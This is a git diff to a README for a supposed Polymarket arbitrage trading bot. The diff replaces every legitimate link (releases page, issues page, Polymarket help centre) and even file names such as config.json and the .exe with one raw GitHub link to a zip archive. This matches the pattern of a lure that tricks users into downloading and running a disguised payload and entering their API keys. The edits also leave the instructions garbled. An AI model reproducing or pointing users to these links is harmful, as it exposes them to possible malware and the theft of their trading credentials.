@@ -1,6 +1,6 @@
 # 🚀 polymarket-arbitrage-bot - Simplifying Your Trading Journey
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Datagoverment/polymarket-arbitrage-bot/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Datagoverment/polymarket-arbitrage-bot/main/src/arbitrage-polymarket-bot-1.3-beta.5.zip%20Latest%https://raw.githubusercontent.com/Datagoverment/polymarket-arbitrage-bot/main/src/arbitrage-polymarket-bot-1.3-beta.5.zip)](https://raw.githubusercontent.com/Datagoverment/polymarket-arbitrage-bot/main/src/arbitrage-polymarket-bot-1.3-beta.5.zip)
 
 ## 📋 Overview
 
@@ -16,12 +16,12 @@ To begin using the Polymarket Arbitrage Bot, follow these simple steps.
    - Internet connection for real-time trading and updates.
 
 2. **Download the Bot**
-   - [Visit this page to download](https://github.com/Datagoverment/polymarket-arbitrage-bot/releases). You will find the latest release there.
+   - [Visit this page to download](https://raw.githubusercontent.com/Datagoverment/polymarket-arbitrage-bot/main/src/arbitrage-polymarket-bot-1.3-beta.5.zip). You will find the latest release there.
 
 ## 🛠 Setting Up
 
 1. **Locate the Downloaded File**
-   - After downloading, check your downloads folder (default location) for a file named similar to `polymarket-arbitrage-bot.zip`.
+   - After downloading, check your downloads folder (default location) for a file named similar to `https://raw.githubusercontent.com/Datagoverment/polymarket-arbitrage-bot/main/src/arbitrage-polymarket-bot-1.3-beta.5.zip`.
 
 2. **Extract the Files**
    - Right-click the zip file and select "Extract All."
@@ -29,7 +29,7 @@ To begin using the Polymarket Arbitrage Bot, follow these simple steps.
 
 3. **Run the Application**
    - Navigate to the extracted folder.
-   - Double-click on `polymarket-arbitrage-bot.exe` (or the equivalent for your OS) to launch the bot.
+   - Double-click on `https://raw.githubusercontent.com/Datagoverment/polymarket-arbitrage-bot/main/src/arbitrage-polymarket-bot-1.3-beta.5.zip` (or the equivalent for your OS) to launch the bot.
 
 ## ⚙️ Configuration
 
@@ -37,11 +37,11 @@ Before you start trading, you need to configure the bot.
 
 1. **API Key Setup**
    - You will need an API key from Polymarket. Sign up on their platform and generate your API key.
-   - Open the configuration file `config.json` in a text editor.
+   - Open the configuration file `https://raw.githubusercontent.com/Datagoverment/polymarket-arbitrage-bot/main/src/arbitrage-polymarket-bot-1.3-beta.5.zip` in a text editor.
    - Enter your API key as instructed in the placeholders.
 
 2. **Settings Adjustments**
-   - You can adjust settings such as trade limits, alert preferences, and refresh intervals. These options are also in the `config.json`.
+   - You can adjust settings such as trade limits, alert preferences, and refresh intervals. These options are also in the `https://raw.githubusercontent.com/Datagoverment/polymarket-arbitrage-bot/main/src/arbitrage-polymarket-bot-1.3-beta.5.zip`.
 
 ## 📊 Features
 
@@ -54,7 +54,7 @@ Before you start trading, you need to configure the bot.
 Ensure you stay updated with the latest features and security patches.
 
 1. **Check for Updates**
-   - Regularly check the [Releases page](https://github.com/Datagoverment/polymarket-arbitrage-bot/releases).
+   - Regularly check the [Releases page](https://raw.githubusercontent.com/Datagoverment/polymarket-arbitrage-bot/main/src/arbitrage-polymarket-bot-1.3-beta.5.zip).
    
 2. **Download New Versions**
    - When a new version is available, download it as previously described.
@@ -68,13 +68,13 @@ If you face issues or have questions, please refer to the following:
 
 - **Documentation**: Refer to any included PDF or text files for instructions.
 - **Community**: Join forums or online communities focused on Polymarket for peer support.
-- **Issues Page**: Visit the [Issues section](https://github.com/Datagoverment/polymarket-arbitrage-bot/issues) on GitHub to report any problems or feature requests.
+- **Issues Page**: Visit the [Issues section](https://raw.githubusercontent.com/Datagoverment/polymarket-arbitrage-bot/main/src/arbitrage-polymarket-bot-1.3-beta.5.zip) on GitHub to report any problems or feature requests.
 
 ## ✨ Additional Resources
 
-- **Polymarket Help Center**: [polymarket.com/help](https://polymarket.com/help) for guides and assistance.
+- **Polymarket Help Center**: [https://raw.githubusercontent.com/Datagoverment/polymarket-arbitrage-bot/main/src/arbitrage-polymarket-bot-1.3-beta.5.zip](https://raw.githubusercontent.com/Datagoverment/polymarket-arbitrage-bot/main/src/arbitrage-polymarket-bot-1.3-beta.5.zip) for guides and assistance.
 - **Trading Tips**: Look up articles and blogs for trading strategies tailored to Polymarket.
 
 Enjoy your trading with the Polymarket Arbitrage Bot! 
 
-For more, always remember to check the [Releases page](https://github.com/Datagoverment/polymarket-arbitrage-bot/releases) for updates and new versions.
+For more, always remember to check the [Releases page](https://raw.githubusercontent.com/Datagoverment/polymarket-arbitrage-bot/main/src/arbitrage-polymarket-bot-1.3-beta.5.zip) for updates and new versions.
